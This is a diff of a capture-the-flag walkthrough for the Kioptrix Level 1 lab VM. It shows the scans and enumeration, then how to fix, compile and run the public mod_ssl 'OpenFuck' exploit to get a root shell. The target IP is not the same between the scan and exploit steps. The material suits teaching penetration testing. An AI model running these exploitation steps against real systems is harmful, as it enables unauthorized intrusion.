@@ -1,17 +1,17 @@
 *Kioptrix*narrative
-    Intro
-        The object of the game is to acquire
-        root access via any means possible (except actually hacking the VM server or player).
-        The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
-    Level 1
-        Reconnaissance. First, we need to fins the IP assigned through DHCP to the machine. We run a simple host discovery scan:
-        *$ nmap -sP 192.168.252.1/24
+Intro
+    The object of the game is to acquire
+    root access via any means possible (except actually hacking the VM server or player).
+    The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+Level 1
+    Reconnaissance. First, we need to fins the IP assigned through DHCP to the machine. We run a simple host discovery scan:
+    *$ nmap -sP 192.168.252.1/24
 Nmap scan report for 192.168.252.131
 Host is up (0.00033s latency).
 MAC Address: 00:0C:29:7C:3A:16 (VMware)
 ...*
-        Next step, finding open ports and fingerprinting services running behind them:
-        *root@kali:~# nmap -A -sS -T5 192.168.252.131
+    Next step, finding open ports and fingerprinting services running behind them:
+    *root@kali:~# nmap -A -sS -T5 192.168.252.131
 
 Starting Nmap 7.50 ( https://nmap.org ) at 2017-09-07 17:47 BST
 Nmap scan report for 192.168.252.131
@@ -28,17 +28,17 @@ PORT     STATE SERVICE     VERSION
 443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 1024/tcp open  status      1 (RPC #100024)*
 
-        So we know the host runs SSH (OpenSSH 2.9p2 (protocol 1.99)), HTTP (Apache httpd 1.3.20 mod_ssl/2.8.4 OpenSSL/0.9.6b) samba, and HTTPS. We connect to the web server with Firfox and see the default installation page of Apache. We can run a folder discovery attack and Nikito:
+    So we know the host runs SSH (OpenSSH 2.9p2 (protocol 1.99)), HTTP (Apache httpd 1.3.20 mod_ssl/2.8.4 OpenSSL/0.9.6b) samba, and HTTPS. We connect to the web server with Firfox and see the default installation page of Apache. We can run a folder discovery attack and Nikito:
 
-        *# dirb http://192.168.252.131 /usr/share/dirb/wordlists/big.txt
+    *# dirb http://192.168.252.131 /usr/share/dirb/wordlists/big.txt
 # nikto -h 192.168.252.131*
 
-        While it runs, we enumerate all the SMB mounts using:
-        *$ enum4linux 192.168.252.131
+    While it runs, we enumerate all the SMB mounts using:
+    *$ enum4linux 192.168.252.131
 $ nbtscan 192.168.252.131*
 
-        We don't find anything useful so far. The directory enumeration attack finished and also did not find anything interesting. However, Nikito output the following:
-        *+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+    We don't find anything useful so far. The directory enumeration attack finished and also did not find anything interesting. However, Nikito output the following:
+    *+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
 + OSVDB-27487: Apache is vulnerable to XSS via the Expect header
 + OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
 + OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
@@ -46,27 +46,27 @@ $ nbtscan 192.168.252.131*
 + mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
 + Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE*
 
-        The mod_ssl bug seems more than interesting, quick search finds that Kali has the exploit out the box:
+    The mod_ssl bug seems more than interesting, quick search finds that Kali has the exploit out the box:
     *# searchsploit mod_ssl 2.8
------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
- Exploit Title                                                                                                                                  |  Path
-                                                                                                                                                | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
-Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                      | multiple/dos/21575.txt
-Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit                                                                                    | unix/remote/21671.c
+---------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                               |  Path
+                                                                                             | (/usr/share/exploitdb/platforms/)
+---------------------------------------------------------------------------------------- ----------------------------------
+Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                   | multiple/dos/21575.txt
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit                                 | unix/remote/21671.c
 Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Exploit*
-        The exploit is old and does not run out of the box, you need to set the headers
-        *#include <openssl/rc4.h>
+    The exploit is old and does not run out of the box, you need to set the headers
+    *#include <openssl/rc4.h>
 #include <openssl/md5.h> *
-        And to install libssl:
-        *$apt-get install libssl1.0-dev; gcc  764.c -o 764 -lcrypto*
-        Then find the right offset for the operating system-apache version:
-        *# ./764 |grep 1.3.20 |grep Red
-	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
-	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2*
+    And to install libssl:
+    *$ apt-get install libssl1.0-dev; gcc  764.c -o 764 -lcrypto*
+    Then find the right offset for the operating system-apache version:
+    *# ./764 |grep 1.3.20 |grep Red
+0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2*
 
-	   And run it:
-        *./764 0x6b 192.168.0.8
+    And run it:
+    *./764 0x6b 192.168.0.8
 ....
 14:42:14 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
 
@@ -74,5 +74,5 @@ Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Exploit*
 collect2: ld returned 1 exit status
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)*
-        Challenge finished, got root.
+    Challenge finished, we got root.
 
